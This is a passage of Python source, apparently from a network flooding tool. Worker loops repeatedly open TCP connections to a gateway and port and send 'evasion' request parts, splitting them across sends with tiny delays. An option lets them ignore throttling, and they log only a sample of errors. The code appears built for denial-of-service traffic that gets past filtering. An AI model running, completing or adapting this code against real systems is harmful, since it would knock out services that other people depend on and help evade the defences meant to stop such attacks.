                sock.connect(target)
                parts = self._get_evasion_request_parts()
                for p in parts:
                    sock.send(p)
                with self.stats_lock:
                    self.stats["connect"] += 1
                if not self.throttle_ignore:
                    time.sleep(0.002)
            except Exception as e:
                if idx == 0 and random.random() < 0.05:
                    self._record_error("CONNECT", e)
            finally:
                self._safe_close_socket(sock)

    def _http_worker(self, idx):
        target = (self.gateway, self.port)

        while not self.stop_flag:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect(target)

                parts = self._get_evasion_request_parts()
                for i, p in enumerate(parts):
                    sock.sendall(p)
                    if len(parts) > 1 and i == 0:
                        time.sleep(0.0005)

                with self.stats_lock:
                    self.stats["http"] += 1
                if not self.throttle_ignore:
                    time.sleep(0.002)
            except Exception as e:
                if idx == 0 and random.random() < 0.05:
                    self._record_error("HTTP", e)
            finally:
                self._safe_close_socket(sock)

